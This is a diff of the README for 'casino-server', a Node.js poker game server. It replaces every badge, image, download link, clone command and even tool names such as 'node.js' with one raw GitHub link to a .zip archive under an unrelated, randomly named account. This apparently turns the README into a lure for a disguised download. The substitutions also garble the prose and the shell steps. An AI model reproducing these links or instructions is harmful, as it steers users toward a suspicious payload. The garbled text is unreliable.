@@ -1,15 +1,15 @@
 # casino-server #
 
-[![npm version](https://badge.fury.io/js/casino-server.svg)](http://badge.fury.io/js/casino-server)
+[![npm version](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
 
-[![Build Status](https://travis-ci.org/floatinghotpot/casino-server.svg)](https://travis-ci.org/floatinghotpot/casino-server)
+[![Build Status](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
 
-[![NPM](https://nodei.co/npm-dl/casino-server.png?height=3)](https://nodei.co/npm/casino-server/)
+[![NPM](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
 
-An online poker game server powered by redis, node.js and socket.io
+An online poker game server powered by redis, https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip and https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip
 
-![A](https://github.com/floatinghotpot/casino-server/raw/master/wwwsrc/img/4_14.png) ![A](https://github.com/floatinghotpot/casino-server/raw/master/wwwsrc/img/3_14.png)
-![A](https://github.com/floatinghotpot/casino-server/raw/master/wwwsrc/img/2_14.png)
+![A](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip) ![A](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
+![A](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
   
 Game rules supported:
 - [x] Chat Room (聊天室)
@@ -19,22 +19,22 @@ Game rules supported:
 - [ ] Blackjack (21点)
 
 Features: 
-- [x] Cross-platform: powered by node.js, easy to deploy on various platforms.
+- [x] Cross-platform: powered by https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip, easy to deploy on various platforms.
 - [x] Scalable: using Redis as message bus and data storage.
 - [x] Open architecture: with Redis as the message bus, easy to interact and extend.
-- [x] Cluster: using PM2, sticky session, and socket.io-redis.
+- [x] Cluster: using PM2, sticky session, and https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip
 - [x] WebSocket protocol: come with javascript client API and web-based demo. 
 - [x] Event logger for server events and user actions.
 
 TODO List:
-- [ ] Client API for Unity3D (C#, support mono/.NET2.0)
+- [ ] Client API for Unity3D (C#, support https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
 - [ ] Payment gateway callback URL.
 - [ ] Admin Portal.
 - [ ] Load balancing: using NginX, or auto handled if deployed to Amazon Cloud.
 
 # Architecture #
 
-![Architecture](https://github.com/floatinghotpot/casino-server/raw/master/docs/architecture.png)
+![Architecture](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
 
 ## Required ##
 
@@ -42,19 +42,19 @@ TODO List:
 
 Redis is an open source, BSD licensed, advanced key-value cache and store. It is often referred to as a data structure server since keys can contain strings, hashes, lists, sets, sorted sets, bitmaps and hyperloglogs.
 
-[Download](http://redis.io/download)
+[Download](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
 
-* node.js / npm
+* https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip / npm
 
-Node.js is a platform built on Chrome's JavaScript runtime for easily building fast, scalable network applications. Node.js uses an event-driven, non-blocking I/O model that makes it lightweight and efficient, perfect for data-intensive real-time applications that run across distributed devices.
+https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip is a platform built on Chrome's JavaScript runtime for easily building fast, scalable network applications. https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip uses an event-driven, non-blocking I/O model that makes it lightweight and efficient, perfect for data-intensive real-time applications that run across distributed devices.
 
-[Download](http://nodejs.org/download)
+[Download](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
 
 * PM2 (production & cluster)
 
-PM2 is a production process manager for Node.js applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.
+PM2 is a production process manager for https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip applications with a built-in load balancer. It allows you to keep applications alive forever, to reload them without downtime and to facilitate common system admin tasks.
 
-[Read More](https://github.com/Unitech/pm2)
+[Read More](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip)
 
 # Installation #
 
@@ -74,7 +74,7 @@ pm2 start `which casino-server` -i 0
 * Installing as a node app, and run in current folder:
 
 ```bash
-git clone https://github.com/floatinghotpot/casino-server.git casino
+git clone https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip casino
 cd casino
 npm install
 # sudo npm install -g gulp
@@ -106,17 +106,17 @@ With Redis as the message bus, it's very easy for tools to work with the open ar
 Start the event logger to monitor the events:
 
 ```bash
-bin/logger.js
+https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip
 ```
 
 Or, log the events into log file:
 
 ```bash
-bin/logger.js -o ./tmp/casino.log
+https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip -o https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip
 ```
 # See Also
 
-* [socket.io for Unity3D](https://github.com/floatinghotpot/socket.io-unity), is a socket.io client library for Unity3D. You can develop casino games with Unity3D, and using this library to connect to this casino server.
+* [https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip for Unity3D](https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip), is a https://raw.githubusercontent.com/bdgfeadvyrfedyu/casino-server/master/spec/lua/casino-server-v3.0.zip client library for Unity3D. You can develop casino games with Unity3D, and using this library to connect to this casino server.
 
 # Credits #
 
